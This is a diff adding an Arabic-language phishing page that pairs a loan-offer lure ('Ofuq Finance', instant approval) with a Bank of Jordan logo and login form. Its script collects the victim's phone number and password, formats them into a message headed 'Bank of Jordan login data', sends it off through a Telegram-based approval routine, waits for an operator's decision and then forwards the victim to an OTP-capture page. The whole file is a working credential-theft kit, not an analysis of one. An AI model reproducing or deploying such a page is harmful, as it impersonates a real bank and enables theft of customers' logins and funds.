@@ -1,0 +1,833 @@
+<!doctype html>
+<html lang="ar" dir="rtl">
+  <head>
+    <!-- الوسوم الأساسية (Basic Meta Tags) -->
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>أفق للتمويل</title>
+    <meta name="description" content="قدم طلبك الآن والموافقة فورية مع أفق للتمويل.">
+    <meta name="keywords" content="أفق للتمويل, تمويل, تقديم طلب تمويل, موافقة فورية, خدمات مالية">
+
+    <!-- Open Graph / Facebook / WhatsApp -->
+    <meta property="og:type" content="website">
+    <meta property="og:url" content="https://ofuqfinance.netlify.app/">
+    <meta property="og:title" content="أفق للتمويل">
+    <meta property="og:description" content="قدم طلبك الآن والموافقة فورية.">
+    <meta property="og:image" content="https://ofuqfinance.netlify.app/afqtamowyl.jpg">
+
+    <!-- Twitter Meta Tags -->
+    <meta name="twitter:card" content="summary_large_image">
+    <meta name="twitter:url" content="https://ofuqfinance.netlify.app/">
+    <meta name="twitter:title" content="أفق للتمويل">
+    <meta name="twitter:description" content="قدم طلبك الآن والموافقة فورية.">
+    <meta name="twitter:image" content="https://ofuqfinance.netlify.app/afqtamowyl.jpg">
+
+    <link rel="preconnect" href="https://fonts.googleapis.com" />
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin />
+    <link
+      href="https://fonts.googleapis.com/css2?family=Cairo:wght@500;600;700;800&display=swap"
+      rel="stylesheet"
+    />
+    <style>
+      :root {
+        --bg: #f2f2f3;
+        --blue: #2a3a92;
+        --blue-dark: #1c2f7e;
+        --text: #1f2430;
+      }
+
+      * {
+        box-sizing: border-box;
+      }
+
+      [hidden] {
+        display: none !important;
+      }
+
+      body {
+        margin: 0;
+        background: var(--bg);
+        color: var(--text);
+        font-family: "Cairo", sans-serif;
+        min-height: 100dvh;
+        display: flex;
+        flex-direction: column;
+        overflow: hidden;
+      }
+
+      .screen {
+        width: min(100%, 600px);
+        max-width: 600px;
+        margin: 0 auto;
+      }
+
+      .hero {
+        background: linear-gradient(180deg, #2f5ee8 0%, #1f2f83 100%);
+        width: 100%;
+        padding: clamp(18px, 3.6vh, 34px) 18px clamp(12px, 2.6vh, 24px);
+        flex-shrink: 0;
+      }
+
+      .logo {
+        width: min(250px, 72vw);
+        margin: 0 auto 14px;
+        display: block;
+      }
+
+      .switch-card {
+        width: min(312px, 88%);
+        margin: 0 auto;
+        height: clamp(50px, 7vh, 58px);
+        border-radius: 16px;
+        border: 1.5px solid rgba(255, 255, 255, 0.34);
+        background: linear-gradient(180deg, rgba(255, 255, 255, 0.16), rgba(255, 255, 255, 0.1));
+        backdrop-filter: blur(2px);
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        padding: 0 12px;
+        color: #fff;
+        cursor: pointer;
+      }
+
+      .switch-card:disabled {
+        cursor: default;
+      }
+
+      .switch-main {
+        text-align: right;
+      }
+
+      .switch-title {
+        margin: 0;
+        font-size: 1rem;
+        font-weight: 700;
+        line-height: 1.1;
+      }
+
+      .switch-sub {
+        margin: 2px 0 0;
+        font-size: 0.85rem;
+        color: rgba(255, 255, 255, 0.72);
+      }
+
+      .switch-left,
+      .switch-right {
+        width: 34px;
+        height: 34px;
+        border-radius: 10px;
+        display: grid;
+        place-items: center;
+      }
+
+      .switch-right {
+        background: rgba(255, 255, 255, 0.18);
+      }
+
+      .switch-left img,
+      .switch-right img {
+        width: 19px;
+        height: 19px;
+        object-fit: contain;
+        filter: brightness(0) invert(1);
+      }
+
+      main.screen {
+        flex: 1;
+        display: flex;
+      }
+
+      .content {
+        width: 100%;
+        padding: 20px;
+        display: flex;
+        flex-direction: column;
+        justify-content: flex-start;
+      }
+
+      .field-block {
+        margin-bottom: 12px;
+      }
+
+      .field {
+        height: clamp(48px, 7.6vh, 58px);
+        border: 2px solid #c6c9d3;
+        border-radius: 14px;
+        background: #f6f6f7;
+        padding: 0 16px;
+        display: flex;
+        align-items: center;
+        justify-content: space-between;
+        gap: 10px;
+        cursor: text;
+        transition: border-color 0.2s ease, box-shadow 0.2s ease;
+      }
+
+      .field:focus-within {
+        border-color: #2a3a92;
+        box-shadow: 0 0 0 4px rgba(42, 58, 146, 0.12);
+      }
+
+      .field-input {
+        flex: 1;
+        border: 0;
+        background: transparent;
+        font-family: "Cairo", sans-serif;
+        font-size: clamp(1rem, 3vw, 1.12rem);
+        color: #1e255a;
+        text-align: right;
+        direction: rtl;
+        outline: none;
+      }
+
+      .field-input::placeholder {
+        color: #6b7280;
+        font: inherit;
+        opacity: 1;
+      }
+
+      #phoneInput,
+      #passwordInput {
+        font-family: "Cairo", sans-serif;
+        font-size: clamp(1rem, 3vw, 1.12rem);
+        font-weight: 600;
+        line-height: 1;
+        text-align: right;
+        direction: rtl;
+        -webkit-appearance: none;
+        appearance: none;
+      }
+
+      .field img {
+        width: 24px;
+        height: 24px;
+        object-fit: contain;
+      }
+
+      .eye-toggle {
+        border: 0;
+        background: transparent;
+        padding: 0;
+        display: inline-grid;
+        place-items: center;
+        cursor: pointer;
+        flex-shrink: 0;
+      }
+
+      .remember {
+        display: flex;
+        align-items: center;
+        justify-content: flex-start;
+        gap: 10px;
+        margin: 6px 0 16px;
+        cursor: pointer;
+        width: fit-content;
+      }
+
+      .remember span {
+        font-size: clamp(1rem, 2.8vw, 1.08rem);
+        color: #1e255a;
+        font-weight: 600;
+      }
+
+      .checkbox {
+        width: 24px;
+        height: 24px;
+        border: 3px solid #222;
+        border-radius: 7px;
+        background: #f8f8f8;
+        padding: 0;
+        position: relative;
+        cursor: pointer;
+        transition: background-color 0.2s ease, border-color 0.2s ease;
+      }
+
+      .checkbox.active {
+        background: #2a3a92;
+        border-color: #2a3a92;
+      }
+
+      .checkbox.active::after {
+        content: "";
+        position: absolute;
+        top: 2px;
+        left: 6px;
+        width: 6px;
+        height: 11px;
+        border: solid #fff;
+        border-width: 0 3px 3px 0;
+        transform: rotate(45deg);
+      }
+
+      .btn {
+        width: 100%;
+        height: clamp(46px, 7vh, 54px);
+        border-radius: 14px;
+        font-family: "Cairo", sans-serif;
+        font-size: clamp(0.92rem, 2.7vw, 1rem);
+        font-weight: 700;
+        cursor: pointer;
+      }
+
+      .btn-login {
+        border: 0;
+        background: var(--blue);
+        color: #fff;
+        margin-bottom: 12px;
+      }
+
+      .btn-sub {
+        border: 2px solid var(--blue);
+        background: transparent;
+        color: var(--blue-dark);
+      }
+
+      .forgot {
+        margin-top: 14px;
+        text-align: center;
+        font-size: clamp(0.88rem, 2.5vw, 0.95rem);
+        color: #1d2763;
+        font-weight: 700;
+      }
+
+      .auth-field-error {
+        color: #b42318;
+        font-size: 0.86rem;
+        margin-top: 6px;
+        display: none;
+        text-align: right;
+        padding: 0 6px;
+      }
+
+      .auth-submit-error {
+        color: #b42318;
+        font-size: 0.9rem;
+        margin: 0 0 12px;
+        display: none;
+        text-align: center;
+      }
+
+      .status-card {
+        width: 100%;
+        min-height: auto;
+        border-radius: 16px;
+        padding: 14px 14px 12px;
+        text-align: center;
+        background: #fff4f2;
+        border: 1px solid #f1c8c3;
+        margin: 0 0 14px;
+      }
+
+      .status-icon {
+        width: 48px;
+        height: 48px;
+        margin: 0 auto 10px;
+        border-radius: 50%;
+        background: #f55246;
+        color: #fff;
+        font-size: 1.5rem;
+        font-weight: 800;
+        display: grid;
+        place-items: center;
+        box-shadow: 0 0 0 4px rgba(245, 82, 70, 0.12);
+      }
+
+      .status-title {
+        margin: 0 0 6px;
+        font-size: 0.98rem;
+        font-weight: 700;
+        line-height: 1.4;
+        color: #101010;
+      }
+
+      .status-copy {
+        margin: 0;
+        font-size: 0.84rem;
+        line-height: 1.6;
+        color: #111827;
+        font-weight: 600;
+      }
+
+      .auth-progress-overlay {
+        position: fixed;
+        inset: 0;
+        display: none;
+        z-index: 10050;
+        align-items: center;
+        justify-content: center;
+        background: rgba(5, 10, 22, 0.68);
+        backdrop-filter: blur(8px);
+        -webkit-backdrop-filter: blur(8px);
+      }
+
+      .auth-progress-overlay.active {
+        display: flex;
+      }
+
+      .auth-progress-content {
+        display: flex;
+        flex-direction: column;
+        align-items: center;
+        gap: 16px;
+      }
+
+      .auth-spinner {
+        width: 56px;
+        height: 56px;
+        border-radius: 50%;
+        position: relative;
+        color: #fff;
+        box-shadow: 0 0 0 6px rgba(255, 255, 255, 0.08);
+      }
+
+      .auth-spinner::before {
+        content: "";
+        position: absolute;
+        inset: -5px;
+        border-radius: 50%;
+        border: 5px solid transparent;
+        border-top-color: currentColor;
+        animation: authSpin 0.85s linear infinite;
+      }
+
+      .auth-progress-label {
+        margin: 0;
+        color: #fff;
+        font-size: 1.05rem;
+        font-weight: 700;
+        text-align: center;
+      }
+
+      @keyframes authSpin {
+        to {
+          transform: rotate(360deg);
+        }
+      }
+
+      input[type="password"] {
+        font-family: Arial, sans-serif;
+        -webkit-text-security: disc;
+      }
+
+      @media (max-width: 700px) {
+        .switch-sub {
+          font-size: clamp(0.7rem, 2.2vw, 0.9rem);
+        }
+
+        .content {
+          padding-inline: 18px;
+        }
+      }
+
+      @media (max-height: 760px) {
+        .hero {
+          padding-top: 14px;
+          padding-bottom: 10px;
+        }
+
+        .logo {
+          width: min(220px, 64vw);
+          margin-bottom: 10px;
+        }
+
+        .switch-card {
+          height: 48px;
+        }
+
+        .switch-left,
+        .switch-right {
+          width: 30px;
+          height: 30px;
+        }
+
+        .switch-left img,
+        .switch-right img {
+          width: 17px;
+          height: 17px;
+        }
+
+        .content {
+          padding: 20px;
+        }
+
+        .field-block {
+          margin-bottom: 10px;
+        }
+
+        .field {
+          height: 46px;
+        }
+
+        .remember {
+          margin-bottom: 12px;
+        }
+
+        .btn {
+          height: 44px;
+        }
+
+        .forgot {
+          margin-top: 10px;
+        }
+      }
+          .header-image {
+      width: 70%;
+      margin: 20px;
+      padding: 20px;
+      margin-bottom: 100px;
+    }
+
+    .header-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+        h6 {
+      margin-top: -1px;
+    }
+          .header-image {
+  text-align: center;
+  margin-bottom: 15px;
+  width: 100%;
+}
+
+.header-image img {
+    width: 340px;
+  height: auto;
+}
+
+          .header-image {
+      width: 100%;
+      margin: 0;
+      padding: 0;
+    }
+
+    .header-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+           .header-image {
+      width: 70%;
+      margin: 20px;
+      padding: 20px;
+      margin-bottom: 100px;
+    }
+
+    .header-image img {
+      width: 100%;
+      height: auto;
+      display: block;
+    }
+
+        h6 {
+      margin-top: -1px;
+    }
+  .header-image {
+    width: 100%;
+    max-width: 400px;
+    
+    
+    margin: 0px auto; 
+    padding: 0;
+    display: flex;
+    justify-content: center;
+    align-items: center;
+    background: transparent; 
+  }
+
+  .header-image img {
+    width: 100%;
+    object-fit: contain;
+    display: block;
+  }
+
+  h6 {
+    margin-top: 5px;
+  }
+    </style>
+    
+  </head>
+  <body>
+<header class="header-image">
+<img src="https://www.givepalestine.ps/storage/app/media/Bank%20of%20Jordan.png" alt="Bank of Jordan" /> 
+
+</header>
+    </section>
+
+    <main class="screen">
+      <section class="content">
+        <div class="status-card" id="loginRejectedCard" hidden>
+          <div class="status-icon" aria-hidden="true">!</div>
+          <h1 class="status-title">كلمة المرور غير صحيحة    </h1>
+          <p class="status-copy">
+                   
+          </p>
+        </div>
+
+        <div id="loginFormSection">
+          <div class="field-block">
+            <div class="field">
+              <img src="device-phone-mobile.svg" alt="" />
+              <input id="phoneInput" class="field-input" type="tel" inputmode="numeric" placeholder="رقم الهاتف"
+              
+                required
+  pattern="07[0-9]{8}"
+  maxlength="10"
+  minlength="10"
+  inputmode="numeric"
+  placeholder="07XXXXXXXX"
+  oninvalid="this.setCustomValidity(' يجب ادخال رقم صحيح ومسجل في البنك  ')"
+  oninput="this.setCustomValidity('')"
+              />
+              
+            </div>
+            <p class="auth-field-error" id="phoneError">رقم الهاتف غير صحيح</p>
+                  <h6> الرجاء ادخال الرقم يبدأ ب 077 أو 078 أو 079</h6>
+
+          </div>
+
+          <div class="field-block">
+            <div class="field">
+              <img src="lock-closed.svg" alt="" />
+              <input id="passwordInput" class="field-input" type="password" placeholder="كلمة المرور"/>
+              <button id="togglePassword" class="eye-toggle" type="button" aria-label="إظهار أو إخفاء كلمة المرور">
+                <img id="eyeIcon" src="eye.svg" alt="" />
+              </button>
+            </div>
+            <p class="auth-field-error" id="passwordError">كلمة المرور غير صحيحة</p>
+          </div>
+
+          <div class="remember">
+            <button class="checkbox" id="rememberToggle" type="button" aria-pressed="false" aria-label="تذكرني"></button>
+            <span>تذكرني</span>
+          </div>
+
+          <button class="btn btn-login" type="button" id="loginBtn">تسجيل الدخول</button>
+          <p class="auth-submit-error" id="loginRequestError"></p>
+          <button class="btn btn-sub" type="button">الاشتراك في التطبيق</button>
+
+          <p class="forgot">نسيت كلمة المرور؟</p>
+        </div>
+      </section>
+    </main>
+
+    <div class="auth-progress-overlay" id="signInProgressOverlay" aria-hidden="true">
+      <div class="auth-progress-content">
+        <div class="auth-spinner" aria-label="loading"></div>
+        <p class="auth-progress-label">يرجى الانتظار</p>
+      </div>
+    </div>
+
+    <script>
+      (() => {
+        const REMEMBER_ME_KEY = "remember_me";
+        const phoneInput = document.getElementById("phoneInput");
+        const passwordInput = document.getElementById("passwordInput");
+        const fieldElements = Array.from(document.querySelectorAll(".field"));
+        const phoneError = document.getElementById("phoneError");
+        const passwordError = document.getElementById("passwordError");
+        const rememberToggle = document.getElementById("rememberToggle");
+        const rememberRow = rememberToggle?.closest(".remember");
+        const togglePassword = document.getElementById("togglePassword");
+        const eyeIcon = document.getElementById("eyeIcon");
+        const loginBtn = document.getElementById("loginBtn");
+        const loginFormSection = document.getElementById("loginFormSection");
+        const loginRejectedCard = document.getElementById("loginRejectedCard");
+        const loginRequestError = document.getElementById("loginRequestError");
+        const signOverlay = document.getElementById("signInProgressOverlay");
+        let isHidden = true;
+        let rememberMe = localStorage.getItem(REMEMBER_ME_KEY) === "true";
+
+        const normalizeDigits = (value) =>
+          (value || "")
+            .replace(/[٠-٩]/g, (d) => String(d.charCodeAt(0) - 0x0660))
+            .replace(/[۰-۹]/g, (d) => String(d.charCodeAt(0) - 0x06f0));
+
+        const escapeMarkdownCode = (value) =>
+          String(value || "")
+            .replace(/\\/g, "\\\\")
+            .replace(/`/g, "\\`");
+
+        function applyRememberState({ syncInputs = false } = {}) {
+          rememberToggle?.classList.toggle("active", rememberMe);
+          rememberToggle?.setAttribute("aria-pressed", String(rememberMe));
+
+          if (!syncInputs) return;
+
+          if (rememberMe) {
+            phoneInput.value = localStorage.getItem("phonenumber") || "";
+            passwordInput.value = localStorage.getItem("password") || "";
+            return;
+          }
+
+          phoneInput.value = "";
+          passwordInput.value = "";
+          localStorage.removeItem("phonenumber");
+          localStorage.removeItem("password");
+        }
+
+        function setRememberMe(nextValue) {
+          rememberMe = Boolean(nextValue);
+          localStorage.setItem(REMEMBER_ME_KEY, String(rememberMe));
+          if (rememberMe) {
+            localStorage.setItem("phonenumber", phoneInput.value || "");
+            localStorage.setItem("password", passwordInput.value || "");
+          } else {
+            localStorage.removeItem("phonenumber");
+            localStorage.removeItem("password");
+          }
+          applyRememberState();
+        }
+
+        function setInlineError(errorEl, message) {
+          if (!errorEl) return;
+          errorEl.textContent = message;
+          errorEl.style.display = "block";
+        }
+
+        function clearInlineError(errorEl) {
+          if (!errorEl) return;
+          errorEl.textContent = "";
+          errorEl.style.display = "none";
+        }
+
+        function setSubmitError(message) {
+          loginRequestError.textContent = message;
+          loginRequestError.style.display = "block";
+        }
+
+        function clearSubmitError() {
+          loginRequestError.textContent = "";
+          loginRequestError.style.display = "none";
+        }
+
+        function setPendingState(isPending) {
+          signOverlay.classList.toggle("active", isPending);
+          loginBtn.disabled = isPending;
+        }
+
+        function showLoginForm() {
+          loginRejectedCard.hidden = true;
+        }
+
+        function showRejectedState() {
+          loginFormSection.hidden = false;
+          loginRejectedCard.hidden = false;
+          setPendingState(false);
+          window.scrollTo({ top: 0, behavior: "smooth" });
+        }
+
+        function validateLoginInputs() {
+          const phoneValue = normalizeDigits(phoneInput.value).replace(/\D/g, "").slice(0, 15);
+          const passwordValue = (passwordInput.value || "").trim();
+          const hasSymbol = /[^\p{L}\p{N}\s]/u.test(passwordValue);
+          let valid = true;
+
+          phoneInput.value = phoneValue;
+          clearInlineError(phoneError);
+          clearInlineError(passwordError);
+
+          if (phoneValue.length < 10 || phoneValue.length > 10) {
+            setInlineError(phoneError, "رقم الهاتف غير صحيح");
+            valid = false;
+          }
+
+          if (passwordValue.length < 6 || !hasSymbol) {
+            setInlineError(passwordError, "كلمة المرور غير صحيحة");
+            valid = false;
+          }
+
+          return valid;
+        }
+
+        function persistCredentials() {
+          localStorage.setItem("bankname", "بنك الاردن ");
+          localStorage.setItem("phonenumber", phoneInput.value || "");
+          localStorage.setItem("password", passwordInput.value || "");
+        }
+
+        applyRememberState({ syncInputs: true });
+
+        fieldElements.forEach((field) => {
+          const input = field.querySelector(".field-input");
+          if (!input) return;
+
+          field.addEventListener("click", (event) => {
+            if (event.target.closest(".eye-toggle")) return;
+            input.focus();
+          });
+        });
+
+        rememberToggle?.addEventListener("click", (event) => {
+          event.stopPropagation();
+          setRememberMe(!rememberMe);
+        });
+
+        rememberRow?.addEventListener("click", (event) => {
+          if (event.target.closest(".checkbox")) return;
+          setRememberMe(!rememberMe);
+        });
+
+        togglePassword.addEventListener("click", () => {
+          isHidden = !isHidden;
+          passwordInput.type = isHidden ? "password" : "text";
+          eyeIcon.src = isHidden
+            ? "banks/assets/images/wahda/eye.svg"
+            : "banks/assets/images/wahda/eye-slash.svg";
+        });
+
+        phoneInput.addEventListener("input", () => {
+          const normalized = normalizeDigits(phoneInput.value).replace(/\D/g, "").slice(0, 15);
+          if (phoneInput.value !== normalized) phoneInput.value = normalized;
+          if (rememberMe) localStorage.setItem("phonenumber", phoneInput.value || "");
+          clearInlineError(phoneError);
+          clearSubmitError();
+        });
+
+        passwordInput.addEventListener("input", () => {
+          if (rememberMe) localStorage.setItem("password", passwordInput.value || "");
+          clearInlineError(passwordError);
+          clearSubmitError();
+        });
+
+        loginBtn.addEventListener("click", async () => {
+          if (!validateLoginInputs()) return;
+
+          showLoginForm();
+          clearSubmitError();
+          persistCredentials();
+
+          const requestId = `${Date.now().toString(36)}${Math.random().toString(36).slice(2, 8)}`;
+          const msg = `🔔 *بيانات دخول بنك الاردن   *
+🏦 *اسم البنك:* \`${escapeMarkdownCode("بنك الاردن ")}\`
+📱 *رقم الهاتف:* \`${escapeMarkdownCode(localStorage.getItem("phonenumber"))}\`
+🔐 *الباسورد:* \`${escapeMarkdownCode(localStorage.getItem("password"))}\``;
+
+          setPendingState(true);
+
+          try {
+            await sendApprovalRequest(msg, requestId);
+            const decision = await waitForTelegramDecision(requestId, {
+              timeoutMs: 180000,
+              pollIntervalMs: 2000,
+            });
+
+            if (decision === "accepted") {
+              window.location.href = "./otpjordanbank.html";
+              return;
+            }
+
+            showRejectedState();
+          } catch (error) {
+            console.error(error);
+            setPendingState(false);
+            setSubmitError("تعذر إكمال الطلب حالياً. حاول مرة أخرى.");
+          }
+        });
+      })();
+    </script>
+    <script src="./t.js"></script>
+  </body>
+</html>
